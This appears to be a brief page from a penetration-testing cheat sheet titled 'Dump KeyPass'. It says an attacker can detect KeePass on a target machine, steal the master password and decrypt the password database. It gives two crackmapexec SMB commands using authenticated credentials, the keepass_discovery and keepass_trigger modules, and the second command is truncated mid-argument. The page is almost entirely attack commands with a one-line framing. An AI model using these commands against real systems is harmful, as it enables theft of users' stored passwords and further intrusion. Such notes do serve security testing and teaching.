# Dump KeyPass



You can check if keepass is installed on the target computer and then steal the master password and decrypt the database !

```
$ crackmapexec smb <ip> -u user -p pass -M keepass_discovery
$ crackmapexec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discov
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
